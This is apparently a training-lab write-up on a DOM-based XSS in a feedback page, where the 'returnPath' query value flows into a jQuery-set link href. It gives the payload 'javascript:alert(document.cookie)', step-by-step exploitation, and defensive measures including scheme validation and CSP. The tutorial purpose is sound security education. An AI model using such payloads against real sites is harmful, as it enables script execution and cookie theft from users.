
# DOM-Based XSS — jQuery `href` Attribute Sink Using `location.search`

## 1. Vulnerability

**Vulnerability:** DOM-Based Cross-Site Scripting (DOM XSS)

**Severity:** Medium

**Source:** `location.search`

**Sink:**  `<a id="backLink" href="/">Back</a> == $θ`

**Affected Page:** Submit Feedback

**Payload:**

```javascript
javascript:alert(document.cookie)
```

### Description

The application contains a DOM-based XSS vulnerability in the **Submit feedback** page.

The page reads the `returnPath` query parameter from `location.search` and uses its value to modify the `href` attribute of the **Back** link.

Because the application does not properly validate the supplied URL scheme, an attacker can provide a `javascript:` URL instead of a normal path.

When the victim clicks the modified **Back** link, the browser interprets the `javascript:` URL as JavaScript and executes:

```javascript
alert(document.cookie)
```

---

# 2. Objective

The objective of this lab is to:

- Identify a DOM XSS source.
- Determine how `location.search` is processed by the application.
- Identify the vulnerable `href` attribute sink.
- Control the destination of the **Back** link.
- Replace a normal URL with a `javascript:` URL.
- Trigger JavaScript execution when the victim clicks the link.
- Display `document.cookie` using the vulnerable link.

---

# 3. Understand the Vulnerability

Before exploiting the vulnerability, understand the data flow:

```text
URL Query Parameter
        ↓
location.search
        ↓
returnPath
        ↓
JavaScript/jQuery
        ↓
href attribute
        ↓
Back link
        ↓
javascript: URL
        ↓
JavaScript execution
```

This is a classic **source-to-sink DOM XSS** scenario.

---

# 4. Step 1 — Open the Submit Feedback Page

Open the lab and navigate to:

**Submit feedback**

At the bottom or relevant section of the page, locate the:

**Back** link.

Initially, the link should point to a normal URL/path.

---


......




# 5. Step 2 — Identify the Query Parameter

Look at the URL in the browser's address bar.

You should find a query parameter similar to:

```text
?returnPath=/
```

The important parameter is:

```text
returnPath
```

This parameter is controlled by the user.

---

# 6. Step 3 — Test the Parameter

Change the `returnPath` parameter to `/` followed by a random alphanumeric string.

For example:

```text
?returnPath=/test123
```

Press:

**Enter**

The purpose of this step is not yet to execute JavaScript.

Instead, we want to determine whether our input reaches the page's DOM.

---


.....





# 7. Step 4 — Inspect the Back Link

Right-click the **Back** link and select:

**Inspect**

Look at the HTML for the anchor element.

You should observe something similar to:

```html
<a href="/test123">Back</a>
```

This is the key discovery.

Your input:

```text
/test123
```

has been inserted into the `href` attribute.

Therefore, the data flow is:

```text
returnPath
    ↓
JavaScript
    ↓
Back link
    ↓
href="/test123"
```

---



......



<img width="1300" height="894" alt="Screenshot 2026-10-06 at 12 56 55 PM" src="https://github.com/user-attachments/assets/f58dc2ad-70a7-4b67-8b69-4f7bece1d863" />



.....


# 8. Step 5 — Identify the DOM XSS Sink

The lab description tells us that jQuery is used to modify the anchor's `href` attribute.

Conceptually, the application is doing something similar to:

```javascript
<a id="backLink" href="/">Back</a> == $θ;
```

The important point is that attacker-controlled data is being used to set the value of an HTML link's `href`.

The vulnerable sink is therefore the link's:

```text
href
```

attribute.

---

# 9. Step 6 — Replace the Path with a JavaScript URL

Now change the `returnPath` parameter to:

```javascript
javascript:alert(document.cookie)
```

For example, the URL will conceptually contain:

```text
?returnPath=javascript:alert(document.cookie)
```

Press:

**Enter**

---

# 10. Step 7 — Inspect the Back Link Again

Inspect the **Back** link.

You should now see that its `href` has been changed to something similar to:

```html
<a href="javascript:alert(document.cookie)">Back</a>
```

This confirms that the attacker-controlled value has reached the vulnerable `href` sink.

---



......


<img width="1301" height="889" alt="Screenshot 2026-10-06 at 12 59 48 PM" src="https://github.com/user-attachments/assets/1a626af8-f096-4024-b9ac-6d595a01f97e" />


.....


# 11. Step 8 — Click the Back Link

Click:

**Back**

The browser interprets the `javascript:` URL as JavaScript code.

The following JavaScript executes:

```javascript
alert(document.cookie)
```

A JavaScript alert should appear containing the page's accessible cookies.

This confirms successful DOM-based XSS.

---



......



<img width="1302" height="895" alt="Screenshot 2026-10-06 at 1 00 14 PM" src="https://github.com/user-attachments/assets/82d03d55-0b42-4b9a-b486-07f7418d52d8" />


.....


# 12. Understand the Payload

The payload is:

```javascript
javascript:alert(document.cookie)
```

It contains two important parts.

### `javascript:`

This is a JavaScript URL scheme.

When used as the destination of a link, the browser can execute the JavaScript code when the link is activated.

### `alert(document.cookie)`

This JavaScript retrieves the cookies accessible to JavaScript and displays them in an alert box.

Therefore:

```text
Click Back
    ↓
href="javascript:..."
    ↓
Browser executes JavaScript
    ↓
document.cookie
    ↓
alert()
```

---

# 13. Why Does This Work?

The application expects `returnPath` to contain a normal path such as:

```text
/
```

or:

```text
/feedback
```

However, the application does not sufficiently restrict the URL scheme.

An attacker can therefore provide:

```text
javascript:alert(document.cookie)
```

Instead of:

```text
/
```

The application places the attacker-controlled value into the link:

```html
<a href="USER_INPUT">Back</a>
```

The browser then interprets the value as a `javascript:` URL.

---

# 14. Source and Sink Analysis

Understanding **source and sink** is one of the most important concepts in DOM XSS.

## Source

The source is where attacker-controlled data enters the client-side application.

Here, the source is:

```javascript
location.search
```

Specifically:

```text
returnPath
```

from the URL query string.

---


---

## Sink

The dangerous destination is the `href` attribute:

```html
<a href="USER_CONTROLLED_VALUE">Back</a>
```

Because the value can contain a `javascript:` scheme, it becomes executable when the link is clicked.

---

# 15. Complete Attack Chain

```text
Attacker-controlled URL
        │
        ▼
returnPath=javascript:alert(document.cookie)
        │
        ▼
location.search
        │
        ▼
Application JavaScript
        │
        ▼
jQuery modifies href
        │
        ▼
<a href="javascript:alert(document.cookie)">
        │
        ▼
Victim clicks "Back"
        │
        ▼
JavaScript executes
        │
        ▼
alert(document.cookie)
```

---

# 16. DOM XSS vs Reflected XSS

This lab is different from a traditional reflected XSS vulnerability.

### Reflected XSS

The server typically receives the malicious input and includes it in the HTTP response.

```text
Attacker
   ↓
HTTP Request
   ↓
Server
   ↓
HTTP Response containing payload
   ↓
Browser
   ↓
JavaScript execution
```

### DOM XSS

The malicious input is processed by client-side JavaScript.

```text
Attacker
   ↓
URL
   ↓
Browser
   ↓
location.search
   ↓
JavaScript
   ↓
DOM sink
   ↓
JavaScript execution
```

In this lab, the vulnerable processing happens in the browser.

---

# 17. Impact

DOM XSS can potentially allow an attacker to execute JavaScript in the context of the vulnerable website.

Depending on the application's functionality and security controls, this may allow an attacker to:

- Modify page content.
- Perform actions as the victim.
- Access data exposed to JavaScript.
- Steal sensitive information accessible to scripts.
- Conduct phishing attacks within the trusted origin.
- Target users with higher privileges.

The actual impact depends on the application's architecture, browser protections, cookie configuration, and available security controls.

---

# 18. Defensive Measures

## 18.1 Validate the URL Scheme

The application should not blindly accept arbitrary URL schemes.

For a `returnPath` parameter that is supposed to contain an internal path, validate that it represents an expected relative path.

For example, an application could enforce an allowlist such as:

```text
/
 /feedback
 /home
```

rather than accepting arbitrary schemes such as:

```text
javascript:
data:
```

---

## 18.2 Avoid Assigning Untrusted Data Directly to `href`

Do not blindly use attacker-controlled input as a link destination.

Unsafe conceptual pattern:

```javascript
$('a').attr('href', userControlledValue);
```

Instead, validate and constrain the value according to the application's expected URL format.

---

## 18.3 Use Safe URL Handling

If the application needs to construct URLs dynamically, use URL parsing and validation mechanisms rather than treating arbitrary strings as trusted URLs.

The application should verify:

- Expected scheme
- Expected origin
- Expected path
- Allowed URL format

---

## 18.4 Avoid Dangerous URL Schemes

Applications should explicitly reject schemes that are not required by the application's functionality, particularly:

```text
javascript:
data:
```

when handling user-controlled navigation URLs.

---

## 18.5 Content Security Policy

A strong Content Security Policy can provide an additional layer of protection against XSS.

For example:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP should be considered defense in depth rather than a substitute for proper input validation and safe DOM manipulation.

---

